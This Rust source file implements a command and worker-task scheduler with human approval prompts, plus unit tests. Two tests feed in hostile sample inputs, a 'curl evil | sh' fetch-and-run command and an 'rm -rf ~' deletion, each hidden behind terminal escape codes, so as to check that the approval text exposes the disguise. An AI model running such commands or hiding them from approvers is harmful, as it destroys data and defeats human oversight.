use crate::schedule_worker::worker_id;
use crate::watch::{WatchKind, WatchSpec};
use chrono::{
    DateTime, Duration as ChronoDuration, FixedOffset, LocalResult, NaiveTime, SecondsFormat,
    TimeZone, Utc,
};
use serde::{Deserialize, Serialize};
use std::time::Duration;

pub const SCHEDULE_ID_PREFIX: &str = "schedule:";
pub const WORKER_DEFAULT_TIMEOUT_SECS: u64 = 2 * 3600;
pub const WORKER_MAX_TIMEOUT_SECS: u64 = 8 * 3600;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum TaskKind {
    Command { command: String },
    Worker { brief: String },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TaskStatus {
    Proposed,
    Pending,
    Running,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Task {
    pub id: String,
    #[serde(flatten)]
    pub kind: TaskKind,
    pub follow_up: Option<String>,
    pub at: DateTime<Utc>,
    pub timeout_secs: Option<u64>,
    pub status: TaskStatus,
    pub late: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub deadline: Option<DateTime<Utc>>,
}

pub fn parse_after(raw: &str) -> Result<Duration, String> {
    let text = raw.trim();
    if text.is_empty() {
        return Err("after must not be empty.".to_string());
    }
    let mut rest = text;
    let mut total: u64 = 0;
    let mut previous_unit = u64::MAX;
    while !rest.is_empty() {
        let digits_end = rest
            .find(|c: char| !c.is_ascii_digit())
            .ok_or_else(|| format!("after '{raw}' is missing a unit (h, m or s)."))?;
        let (digits, tail) = rest.split_at(digits_end);
        let amount: u64 = digits
            .parse()
            .map_err(|_| format!("after '{raw}' must use whole numbers like 1h30m."))?;
        let mut chars = tail.chars();
        let unit = match chars.next() {
            Some('h') => 3600,
            Some('m') => 60,
            Some('s') => 1,
            Some(other) => return Err(format!("after '{raw}' has unknown unit '{other}'.")),
            None => return Err(format!("after '{raw}' is missing a unit (h, m or s).")),
        };
        if unit >= previous_unit {
            return Err(format!(
                "after '{raw}' must list each unit once, largest first."
            ));
        }
        previous_unit = unit;
        total = amount
            .checked_mul(unit)
            .and_then(|secs| total.checked_add(secs))
            .ok_or_else(|| format!("after '{raw}' is too large."))?;
        rest = chars.as_str();
    }
    if total == 0 {
        return Err("after must be longer than zero.".to_string());
    }
    Ok(Duration::from_secs(total))
}

pub fn parse_at<Tz: TimeZone>(
    raw: &str,
    now: DateTime<Utc>,
    zone: &Tz,
) -> Result<DateTime<Utc>, String> {
    let text = raw.trim();
    if let Ok(moment) = DateTime::parse_from_rfc3339(text) {
        let moment = moment.with_timezone(&Utc);
        if moment <= now {
            return Err(format!(
                "at '{raw}' is in the past (now is {}). Give a future time, or use after.",
                now.to_rfc3339_opts(SecondsFormat::Secs, true)
            ));
        }
        return Ok(moment);
    }
    let time = NaiveTime::parse_from_str(text, "%H:%M")
        .map_err(|_| format!("at '{raw}' must be an RFC 3339 timestamp or a local HH:MM time."))?;
    let local_now = now.with_timezone(zone).naive_local();
    let today = local_now.date();
    for day in [today, today + ChronoDuration::days(1)] {
        let wanted = day.and_time(time);
        let resolved = zone
            .from_local_datetime(&wanted)
            .map(|moment| moment.with_timezone(&Utc));
        if matches!(resolved, LocalResult::None) && wanted > local_now {
            return Err(format!(
                "at '{raw}' does not exist on {day} in the local time zone (a daylight saving change skips it). Give another time, or use after."
            ));
        }
        if let Some(moment) = [resolved.earliest(), resolved.latest()]
            .into_iter()
            .flatten()
            .find(|moment| *moment > now)
        {
            return Ok(moment);
        }
    }
    Err(format!("at '{raw}' is not a valid local time."))
}

pub fn escape_controls(text: &str) -> String {
    text.chars()
        .map(|c| match c {
            '\n' => "\\n".to_string(),
            '\r' => "\\r".to_string(),
            '\t' => "\\t".to_string(),
            c if c.is_control() => format!("\\x{:02x}", u32::from(c)),
            c => c.to_string(),
        })
        .collect()
}

pub fn due(tasks: &[Task], now: DateTime<Utc>) -> Vec<&Task> {
    tasks
        .iter()
        .filter(|task| task.status == TaskStatus::Pending && task.at <= now)
        .collect()
}

pub fn plan_restore(tasks: Vec<Task>, now: DateTime<Utc>, alive_workers: &[String]) -> Vec<Task> {
    tasks
        .into_iter()
        .map(|task| match task.status {
            TaskStatus::Running
                if matches!(task.kind, TaskKind::Worker { .. })
                    && alive_workers.contains(&worker_id(&task.id)) =>
            {
                task
            }
            TaskStatus::Running => Task {
                status: TaskStatus::Pending,
                late: task.late || task.at < now,
                deadline: None,
                ..task
            },
            TaskStatus::Pending => Task {
                late: task.late || task.at < now,
                ..task
            },
            TaskStatus::Proposed => task,
        })
        .collect()
}

#[derive(Debug, PartialEq, Eq)]
pub struct TickPlan<'a> {
    pub fire: Vec<&'a Task>,
    pub finished: Vec<&'a Task>,
}

pub fn plan_tick<'a>(
    tasks: &'a [Task],
    active_watch_ids: &[String],
    now: DateTime<Utc>,
) -> TickPlan<'a> {
    TickPlan {
        fire: due(tasks, now)
            .into_iter()
            .filter(|task| matches!(task.kind, TaskKind::Command { .. }))
            .collect(),
        finished: tasks
            .iter()
            .filter(|task| matches!(task.kind, TaskKind::Command { .. }))
            .filter(|task| task.status == TaskStatus::Running)
            .filter(|task| !active_watch_ids.contains(&watch_id(&task.id)))
            .collect(),
    }
}

pub fn watch_id(id: &str) -> String {
    format!("{SCHEDULE_ID_PREFIX}{id}")
}

pub fn to_watch_spec(task: &Task, now: DateTime<Utc>, offset: FixedOffset) -> Option<WatchSpec> {
    let TaskKind::Command { command } = &task.kind else {
        return None;
    };
    let timeout = task.timeout_secs.map(Duration::from_secs);
    Some(WatchSpec {
        id: watch_id(&task.id),
        command: command.clone(),
        follow_up: follow_up(task, now, offset),
        kind: WatchKind::Normal,
        timeout,
        limit: timeout,
    })
}

fn follow_up(task: &Task, now: DateTime<Utc>, offset: FixedOffset) -> Option<String> {
    if !task.late {
        return task.follow_up.clone();
    }
    let notice = format!(
        "Ran late: due {}, started {}.",
        task.at.with_timezone(&offset).format("%H:%M"),
        now.with_timezone(&offset).format("%H:%M"),
    );
    Some(match &task.follow_up {
        Some(text) => format!("{notice}\n{text}"),
        None => notice,
    })
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Answer {
    Yes,
    No,
    Ask,
}

pub fn parse_answer(raw: &str) -> Answer {
    match raw.trim().to_ascii_lowercase().as_str() {
        "y" | "yes" => Answer::Yes,
        "n" | "no" => Answer::No,
        _ => Answer::Ask,
    }
}

pub fn proposed(tasks: Vec<Task>) -> Vec<Task> {
    let mut proposed: Vec<Task> = tasks
        .into_iter()
        .filter(|task| task.status == TaskStatus::Proposed)
        .collect();
    proposed.sort_by(|a, b| a.at.cmp(&b.at).then_with(|| a.id.cmp(&b.id)));
    proposed
}

pub fn format_span(secs: u64) -> String {
    let (hours, minutes, seconds) = (secs / 3600, secs % 3600 / 60, secs % 60);
    let parts: String = [(hours, 'h'), (minutes, 'm'), (seconds, 's')]
        .into_iter()
        .filter(|(amount, _)| *amount > 0)
        .map(|(amount, unit)| format!("{amount}{unit}"))
        .collect();
    if parts.is_empty() {
        "0s".to_string()
    } else {
        parts
    }
}

pub fn approval_question(
    task: &Task,
    now: DateTime<Utc>,
    offset: FixedOffset,
    default_timeout: Duration,
) -> String {
    let local = task.at.with_timezone(&offset);
    let when = if local.date_naive() == now.with_timezone(&offset).date_naive() {
        local.format("%H:%M").to_string()
    } else {
        local.format("%Y-%m-%d %H:%M").to_string()
    };
    let remaining = (task.at - now).num_seconds();
    let relative = if remaining > 0 {
        format!("in {}", format_span(remaining.unsigned_abs()))
    } else {
        "now".to_string()
    };
    let (heading, timeout) = match &task.kind {
        TaskKind::Command { command } => (
            format!(
                "Scheduled command {}:\n  {}\n",
                escape_controls(&task.id),
                escape_controls(command)
            ),
            match task.timeout_secs {
                Some(secs) => format!("timeout {}", format_span(secs)),
                None => format!("default timeout {}", format_span(default_timeout.as_secs())),
            },
        ),
        TaskKind::Worker { brief } => (
            format!(
                "Scheduled worker {}:\n{}\nBase: origin/main at fire time. Never pushes.\n",
                escape_controls(&task.id),
                indent_brief(brief)
            ),
            format!(
                "timeout {}",
                format_span(task.timeout_secs.unwrap_or(WORKER_DEFAULT_TIMEOUT_SECS))
            ),
        ),
    };
    format!("{heading}Runs at {when} ({relative}), {timeout}.\nArm it? [y/n] ")
}

fn indent_brief(brief: &str) -> String {
    brief
        .lines()
        .map(|line| format!("  {}", escape_controls(line)))
        .collect::<Vec<_>>()
        .join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn utc(text: &str) -> DateTime<Utc> {
        DateTime::parse_from_rfc3339(text)
            .unwrap()
            .with_timezone(&Utc)
    }

    fn offset() -> FixedOffset {
        FixedOffset::east_opt(2 * 3600).unwrap()
    }

    fn task(id: &str, at: &str, status: TaskStatus) -> Task {
        Task {
            id: id.to_string(),
            kind: TaskKind::Command {
                command: "echo hi".to_string(),
            },
            follow_up: None,
            at: utc(at),
            timeout_secs: None,
            status,
            late: false,
            deadline: None,
        }
    }

    #[test]
    fn after_parses_units_and_combinations() {
        assert_eq!(parse_after("90s").unwrap(), Duration::from_secs(90));
        assert_eq!(parse_after("10m").unwrap(), Duration::from_secs(600));
        assert_eq!(parse_after("2h").unwrap(), Duration::from_secs(7200));
        assert_eq!(parse_after("1h30m").unwrap(), Duration::from_secs(5400));
        assert_eq!(parse_after("1h30m15s").unwrap(), Duration::from_secs(5415));
        assert_eq!(parse_after(" 5m ").unwrap(), Duration::from_secs(300));
    }

    #[test]
    fn after_rejects_bad_input() {
        for bad in [
            "",
            "  ",
            "0s",
            "0h0m",
            "5",
            "m",
            "5d",
            "1s1m",
            "1m1m",
            "-5m",
            "1.5h",
            "5 m",
            "h5",
            "99999999999999999999s",
            "18446744073709551615h",
        ] {
            assert!(parse_after(bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn at_accepts_rfc3339() {
        let now = utc("2026-01-01T10:00:00Z");
        assert_eq!(
            parse_at("2026-01-02T12:00:00+02:00", now, &offset()).unwrap(),
            utc("2026-01-02T10:00:00Z")
        );
    }

    #[test]
    fn at_refuses_a_past_or_present_rfc3339_time() {
        let now = utc("2026-01-01T10:00:00Z");
        for past in ["2026-01-01T09:59:00Z", "2026-01-01T12:00:00+02:00"] {
            let error = parse_at(past, now, &offset()).unwrap_err();
            assert!(error.contains("is in the past"), "{error}");
            assert!(error.contains("2026-01-01T10:00:00Z"), "{error}");
        }
    }

    /// A zone at +01:00 that springs forward to +02:00 at 2026-03-29T01:00Z,
    /// so local 02:00..03:00 that day does not exist.
    #[derive(Clone)]
    struct SpringForward;

    impl SpringForward {
        fn switch() -> chrono::NaiveDateTime {
            utc("2026-03-29T01:00:00Z").naive_utc()
        }

        fn at_utc(utc: &chrono::NaiveDateTime) -> FixedOffset {
            let hours = if *utc < Self::switch() { 1 } else { 2 };
            FixedOffset::east_opt(hours * 3600).unwrap()
        }
    }

    impl TimeZone for SpringForward {
        type Offset = FixedOffset;

        fn from_offset(_: &FixedOffset) -> Self {
            SpringForward
        }

        fn offset_from_local_date(&self, local: &chrono::NaiveDate) -> LocalResult<FixedOffset> {
            self.offset_from_local_datetime(&local.and_time(NaiveTime::MIN))
        }

        fn offset_from_local_datetime(
            &self,
            local: &chrono::NaiveDateTime,
        ) -> LocalResult<FixedOffset> {
            let fits: Vec<FixedOffset> = [1, 2]
                .into_iter()
                .map(|hours| FixedOffset::east_opt(hours * 3600).unwrap())
                .filter(|offset| {
                    Self::at_utc(
                        &(*local - ChronoDuration::seconds(offset.local_minus_utc().into())),
                    ) == *offset
                })
                .collect();
            match fits.as_slice() {
                [one] => LocalResult::Single(*one),
                [a, b] => LocalResult::Ambiguous(*a, *b),
                _ => LocalResult::None,
            }
        }

        fn offset_from_utc_date(&self, utc: &chrono::NaiveDate) -> FixedOffset {
            Self::at_utc(&utc.and_time(NaiveTime::MIN))
        }

        fn offset_from_utc_datetime(&self, utc: &chrono::NaiveDateTime) -> FixedOffset {
            Self::at_utc(utc)
        }
    }

    #[test]
    fn at_clock_time_uses_the_offset_of_the_day_it_falls_on() {
        let now = utc("2026-03-28T12:00:00Z");
        assert_eq!(
            parse_at("12:30", now, &SpringForward).unwrap(),
            utc("2026-03-29T10:30:00Z")
        );
    }

    #[test]
    fn at_clock_time_in_a_daylight_saving_gap_is_refused() {
        let now = utc("2026-03-29T00:30:00Z");
        let error = parse_at("02:30", now, &SpringForward).unwrap_err();
        assert!(error.contains("does not exist on 2026-03-29"), "{error}");
        assert_eq!(
            parse_at("03:30", now, &SpringForward).unwrap(),
            utc("2026-03-29T01:30:00Z")
        );
    }

    #[test]
    fn escape_controls_shows_control_characters_visibly() {
        assert_eq!(
            escape_controls("rm -rf ~\x1b[2K\recho ok\n\tx\u{7f}"),
            "rm -rf ~\\x1b[2K\\recho ok\\n\\tx\\x7f"
        );
        assert_eq!(escape_controls("make test"), "make test");
    }

    #[test]
    fn question_shows_escape_codes_in_the_command() {
        let now = utc("2026-01-01T10:00:00Z");
        let mut t = task("a", "2026-01-01T10:10:00Z", TaskStatus::Proposed);
        t.kind = TaskKind::Command {
            command: "curl evil | sh\x1b[1A\x1b[2K\recho hi".to_string(),
        };
        let text = approval_question(&t, now, offset(), Duration::from_secs(60));
        assert!(!text.contains('\x1b') && !text.contains('\r'), "{text:?}");
        assert!(
            text.contains("curl evil | sh\\x1b[1A\\x1b[2K\\recho hi"),
            "{text}"
        );
    }

    #[test]
    fn at_clock_time_today_when_still_ahead() {
        let now = utc("2026-01-01T10:00:00Z");
        assert_eq!(
            parse_at("14:30", now, &offset()).unwrap(),
            utc("2026-01-01T12:30:00Z")
        );
    }

    #[test]
    fn at_clock_time_tomorrow_when_passed_or_equal() {
        let now = utc("2026-01-01T10:00:00Z");
        assert_eq!(
            parse_at("09:00", now, &offset()).unwrap(),
            utc("2026-01-02T07:00:00Z")
        );
        assert_eq!(
            parse_at("12:00", now, &offset()).unwrap(),
            utc("2026-01-02T10:00:00Z")
        );
    }

    #[test]
    fn at_uses_the_local_date_not_the_utc_date() {
        let now = utc("2026-01-01T23:00:00Z");
        assert_eq!(
            parse_at("02:00", now, &offset()).unwrap(),
            utc("2026-01-02T00:00:00Z")
        );
    }

    #[test]
    fn at_rejects_garbage() {
        let now = utc("2026-01-01T10:00:00Z");
        for bad in ["", "tomorrow", "25:00", "12:60", "2026-01-01"] {
            assert!(parse_at(bad, now, &offset()).is_err(), "{bad}");
        }
    }

    #[test]
    fn due_returns_only_pending_tasks_at_or_before_now() {
        let now = utc("2026-01-01T10:00:00Z");
        let tasks = vec![
            task("past", "2026-01-01T09:00:00Z", TaskStatus::Pending),
            task("exact", "2026-01-01T10:00:00Z", TaskStatus::Pending),
            task("future", "2026-01-01T10:00:01Z", TaskStatus::Pending),
            task("proposed", "2026-01-01T09:00:00Z", TaskStatus::Proposed),
            task("running", "2026-01-01T09:00:00Z", TaskStatus::Running),
        ];
        let ids: Vec<&str> = due(&tasks, now).iter().map(|t| t.id.as_str()).collect();
        assert_eq!(ids, vec!["past", "exact"]);
    }

    #[test]
    fn restore_requeues_running_and_marks_overdue_late() {
        let now = utc("2026-01-01T10:00:00Z");
        let restored = plan_restore(
            vec![
                task("run-past", "2026-01-01T09:00:00Z", TaskStatus::Running),
                task("run-future", "2026-01-01T11:00:00Z", TaskStatus::Running),
                task("pend-past", "2026-01-01T09:00:00Z", TaskStatus::Pending),
                task("pend-now", "2026-01-01T10:00:00Z", TaskStatus::Pending),
                task("pend-future", "2026-01-01T11:00:00Z", TaskStatus::Pending),
                task("prop-past", "2026-01-01T09:00:00Z", TaskStatus::Proposed),
            ],
            now,
            &[],
        );
        let view: Vec<(TaskStatus, bool)> = restored.iter().map(|t| (t.status, t.late)).collect();
        assert_eq!(
            view,
            vec![
                (TaskStatus::Pending, true),
                (TaskStatus::Pending, false),
                (TaskStatus::Pending, true),
                (TaskStatus::Pending, false),
                (TaskStatus::Pending, false),
                (TaskStatus::Proposed, false),
            ]
        );
    }

    fn worker_in(id: &str, status: TaskStatus) -> Task {
        Task {
            kind: TaskKind::Worker {
                brief: "do it".to_string(),
            },
            deadline: Some(utc("2026-01-01T11:00:00Z")),
            ..task(id, "2026-01-01T09:00:00Z", status)
        }
    }

    #[test]
    fn restore_keeps_a_running_worker_whose_harness_is_alive() {
        let now = utc("2026-01-01T10:00:00Z");
        let running = worker_in("a", TaskStatus::Running);
        let restored = plan_restore(vec![running.clone()], now, &["sched-a".to_string()]);
        assert_eq!(restored, vec![running]);
    }

    #[test]
    fn restore_requeues_a_running_worker_whose_harness_is_gone() {
        let now = utc("2026-01-01T10:00:00Z");
        let restored = plan_restore(
            vec![
                worker_in("a", TaskStatus::Running),
                worker_in("b", TaskStatus::Running),
            ],
            now,
            &["sched-b".to_string()],
        );
        assert_eq!(restored[0].status, TaskStatus::Pending);
        assert!(restored[0].late);
        assert_eq!(restored[0].deadline, None);
        assert_eq!(restored[1].status, TaskStatus::Running);
    }

    #[test]
    fn restore_requeues_a_running_command_even_if_a_worker_has_its_id() {
        let now = utc("2026-01-01T10:00:00Z");
        let restored = plan_restore(
            vec![task("a", "2026-01-01T09:00:00Z", TaskStatus::Running)],
            now,
            &["sched-a".to_string()],
        );
        assert_eq!(restored[0].status, TaskStatus::Pending);
    }

    #[test]
    fn the_command_tick_ignores_worker_tasks() {
        let now = utc("2026-01-01T10:00:00Z");
        let tasks = [
            worker_in("pending", TaskStatus::Pending),
            worker_in("running", TaskStatus::Running),
            task("cmd", "2026-01-01T09:00:00Z", TaskStatus::Pending),
        ];
        let plan = plan_tick(&tasks, &[], now);
        let fired: Vec<&str> = plan.fire.iter().map(|t| t.id.as_str()).collect();
        assert_eq!(fired, ["cmd"]);
        assert!(plan.finished.is_empty());
    }

    #[test]
    fn restore_keeps_an_existing_late_flag() {
        let mut already = task("x", "2026-01-01T11:00:00Z", TaskStatus::Pending);
        already.late = true;
        let restored = plan_restore(vec![already], utc("2026-01-01T10:00:00Z"), &[]);
        assert!(restored[0].late);
    }

    #[test]
    fn watch_id_has_the_schedule_prefix() {
        assert_eq!(watch_id("nightly"), "schedule:nightly");
    }

    #[test]
    fn spec_is_never_persistent() {
        let now = utc("2026-01-01T10:00:00Z");
        let spec = to_watch_spec(
            &task("a", "2026-01-01T10:00:00Z", TaskStatus::Pending),
            now,
            offset(),
        )
        .unwrap();
        assert_eq!(spec.kind, WatchKind::Normal);
    }

    #[test]
    fn spec_carries_command_id_and_timeout() {
        let now = utc("2026-01-01T10:00:00Z");
        let mut t = task("a", "2026-01-01T10:00:00Z", TaskStatus::Pending);
        t.follow_up = Some("summarise".to_string());
        t.timeout_secs = Some(30);
        let spec = to_watch_spec(&t, now, offset()).unwrap();
        assert_eq!(spec.id, "schedule:a");
        assert_eq!(spec.command, "echo hi");
        assert_eq!(spec.follow_up.as_deref(), Some("summarise"));
        assert_eq!(spec.timeout, Some(Duration::from_secs(30)));
        assert_eq!(spec.limit, Some(Duration::from_secs(30)));
    }

    #[test]
    fn spec_without_timeout_leaves_the_default_to_the_caller() {
        let now = utc("2026-01-01T10:00:00Z");
        let spec = to_watch_spec(
            &task("a", "2026-01-01T10:00:00Z", TaskStatus::Pending),
            now,
            offset(),
        )
        .unwrap();
        assert_eq!(spec.timeout, None);
        assert_eq!(spec.limit, None);
        assert_eq!(spec.follow_up, None);
    }

    #[test]
    fn late_spec_prefixes_the_follow_up_in_local_time() {
        let now = utc("2026-01-01T10:05:00Z");
        let mut t = task("a", "2026-01-01T08:30:00Z", TaskStatus::Pending);
        t.late = true;
        let bare = to_watch_spec(&t, now, offset()).unwrap();
        assert_eq!(
            bare.follow_up.as_deref(),
            Some("Ran late: due 10:30, started 12:05.")
        );
        t.follow_up = Some("summarise".to_string());
        let with = to_watch_spec(&t, now, offset()).unwrap();
        assert_eq!(
            with.follow_up.as_deref(),
            Some("Ran late: due 10:30, started 12:05.\nsummarise")
        );
    }

    #[test]
    fn task_round_trips_through_json() {
        let t = task("a", "2026-01-01T10:00:00Z", TaskStatus::Proposed);
        let back: Task = serde_json::from_slice(&serde_json::to_vec(&t).unwrap()).unwrap();
        assert_eq!(back, t);
    }

    fn worker_task(brief: &str) -> Task {
        Task {
            kind: TaskKind::Worker {
                brief: brief.to_string(),
            },
            ..task("night", "2026-01-01T12:30:00Z", TaskStatus::Proposed)
        }
    }

    #[test]
    fn a_worker_task_has_no_watch_spec() {
        let now = utc("2026-01-01T10:00:00Z");
        assert_eq!(to_watch_spec(&worker_task("do it"), now, offset()), None);
    }

    #[test]
    fn stored_command_records_keep_their_shape() {
        let stored = r#"{"id":"a","kind":"command","command":"echo hi","follow_up":null,"at":"2026-01-01T10:00:00Z","timeout_secs":null,"status":"pending","late":false}"#;
        let t: Task = serde_json::from_str(stored).unwrap();
        assert_eq!(t, task("a", "2026-01-01T10:00:00Z", TaskStatus::Pending));
        let back: serde_json::Value = serde_json::to_value(&t).unwrap();
        assert_eq!(
            back,
            serde_json::from_str::<serde_json::Value>(stored).unwrap()
        );
    }

    #[test]
    fn a_worker_task_round_trips_with_its_brief() {
        let t = worker_task("line one\nline two");
        let json = serde_json::to_string(&t).unwrap();
        assert!(json.contains(r#""kind":"worker""#), "{json}");
        assert!(json.contains(r#""brief":"line one\nline two""#), "{json}");
        assert_eq!(serde_json::from_str::<Task>(&json).unwrap(), t);
    }

    #[test]
    fn worker_question_shows_the_full_brief_base_and_default_timeout() {
        let now = utc("2026-01-01T10:00:00Z");
        let text = approval_question(
            &worker_task("fix the flaky test\n  keep it small"),
            now,
            offset(),
            Duration::from_secs(60),
        );
        assert_eq!(
            text,
            "Scheduled worker night:\n  fix the flaky test\n    keep it small\nBase: origin/main at fire time. Never pushes.\nRuns at 14:30 (in 2h30m), timeout 2h.\nArm it? [y/n] "
        );
    }

    #[test]
    fn worker_question_uses_the_given_timeout_and_escapes_controls() {
        let now = utc("2026-01-01T10:00:00Z");
        let mut t = worker_task("go\x1b[2K\rnow");
        t.timeout_secs = Some(5400);
        let text = approval_question(&t, now, offset(), Duration::from_secs(60));
        assert!(text.contains("timeout 1h30m."), "{text}");
        assert!(text.contains("  go\\x1b[2K\\rnow\n"), "{text}");
        assert!(!text.contains('\x1b') && !text.contains('\r'), "{text:?}");
    }

    #[test]
    fn answer_accepts_yes_in_any_case() {
        for yes in ["y", "Y", "yes", "YES", " Yes \n"] {
            assert_eq!(parse_answer(yes), Answer::Yes, "{yes}");
        }
    }

    #[test]
    fn answer_accepts_no_in_any_case() {
        for no in ["n", "N", "no", "NO", " no\n"] {
            assert_eq!(parse_answer(no), Answer::No, "{no}");
        }
    }

    #[test]
    fn anything_else_asks_again() {
        for other in ["go", "", "  ", "\n", "yep", "yes please", "nope", "ok"] {
            assert_eq!(parse_answer(other), Answer::Ask, "{other:?}");
        }
    }

    #[test]
    fn proposed_keeps_only_proposed_ordered_by_time_then_id() {
        let kept = proposed(vec![
            task("late", "2026-01-01T12:00:00Z", TaskStatus::Proposed),
            task("armed", "2026-01-01T08:00:00Z", TaskStatus::Pending),
            task("b", "2026-01-01T09:00:00Z", TaskStatus::Proposed),
            task("a", "2026-01-01T09:00:00Z", TaskStatus::Proposed),
            task("run", "2026-01-01T07:00:00Z", TaskStatus::Running),
        ]);
        let ids: Vec<&str> = kept.iter().map(|t| t.id.as_str()).collect();
        assert_eq!(ids, vec!["a", "b", "late"]);
    }

    #[test]
    fn span_formats_hours_minutes_seconds() {
        assert_eq!(format_span(0), "0s");
        assert_eq!(format_span(45), "45s");
        assert_eq!(format_span(60), "1m");
        assert_eq!(format_span(1800), "30m");
        assert_eq!(format_span(5400), "1h30m");
        assert_eq!(format_span(3661), "1h1m1s");
        assert_eq!(format_span(7200), "2h");
    }

    #[test]
    fn question_shows_command_time_remaining_and_timeout() {
        let now = utc("2026-01-01T10:00:00Z");
        let mut t = task("nightly", "2026-01-01T12:30:00Z", TaskStatus::Proposed);
        t.kind = TaskKind::Command {
            command: "make deploy".to_string(),
        };
        t.timeout_secs = Some(1800);
        let text = approval_question(&t, now, offset(), Duration::from_secs(600));
        assert!(text.contains("\n  make deploy\n"));
        assert!(text.contains("Runs at 14:30 (in 2h30m), timeout 30m."));
        assert!(text.ends_with("[y/n] "));
    }

    #[test]
    fn question_shows_the_date_when_not_today() {
        let now = utc("2026-01-01T10:00:00Z");
        let t = task("a", "2026-01-02T07:00:00Z", TaskStatus::Proposed);
        let text = approval_question(&t, now, offset(), Duration::from_secs(600));
        assert!(text.contains("Runs at 2026-01-02 09:00 (in 21h)"));
    }

    #[test]
    fn question_uses_the_local_date_for_today() {
        let now = utc("2026-01-01T23:00:00Z");
        let t = task("a", "2026-01-02T00:30:00Z", TaskStatus::Proposed);
        let text = approval_question(&t, now, offset(), Duration::from_secs(600));
        assert!(text.contains("Runs at 02:30 (in 1h30m)"));
    }

    #[test]
    fn question_names_the_default_timeout_when_none_is_set() {
        let now = utc("2026-01-01T10:00:00Z");
        let t = task("a", "2026-01-01T10:10:00Z", TaskStatus::Proposed);
        let text = approval_question(&t, now, offset(), Duration::from_secs(3600));
        assert!(text.contains("(in 10m), default timeout 1h."));
    }

    #[test]
    fn question_for_a_past_time_says_now() {
        let now = utc("2026-01-01T10:00:00Z");
        let t = task("a", "2026-01-01T09:00:00Z", TaskStatus::Proposed);
        let text = approval_question(&t, now, offset(), Duration::from_secs(60));
        assert!(text.contains("(now)"));
    }

    #[test]
    fn tick_fires_due_pending_and_finishes_running_without_a_watch() {
        let now = utc("2026-01-01T10:00:00Z");
        let tasks = vec![
            task("due", "2026-01-01T09:00:00Z", TaskStatus::Pending),
            task("later", "2026-01-01T11:00:00Z", TaskStatus::Pending),
            task("alive", "2026-01-01T08:00:00Z", TaskStatus::Running),
            task("gone", "2026-01-01T08:00:00Z", TaskStatus::Running),
            task("prop", "2026-01-01T08:00:00Z", TaskStatus::Proposed),
        ];
        let plan = plan_tick(&tasks, &["schedule:alive".to_string()], now);
        let fire: Vec<&str> = plan.fire.iter().map(|t| t.id.as_str()).collect();
        let finished: Vec<&str> = plan.finished.iter().map(|t| t.id.as_str()).collect();
        assert_eq!(fire, vec!["due"]);
        assert_eq!(finished, vec!["gone"]);
    }

    #[test]
    fn tick_with_nothing_to_do_is_empty() {
        let now = utc("2026-01-01T10:00:00Z");
        let plan = plan_tick(&[], &[], now);
        assert!(plan.fire.is_empty() && plan.finished.is_empty());
    }

    #[test]
    fn tick_ignores_a_pending_task_even_when_a_same_named_watch_runs() {
        let now = utc("2026-01-01T10:00:00Z");
        let tasks = vec![task("a", "2026-01-01T12:00:00Z", TaskStatus::Pending)];
        let plan = plan_tick(&tasks, &["schedule:a".to_string()], now);
        assert!(plan.fire.is_empty() && plan.finished.is_empty());
    }
}
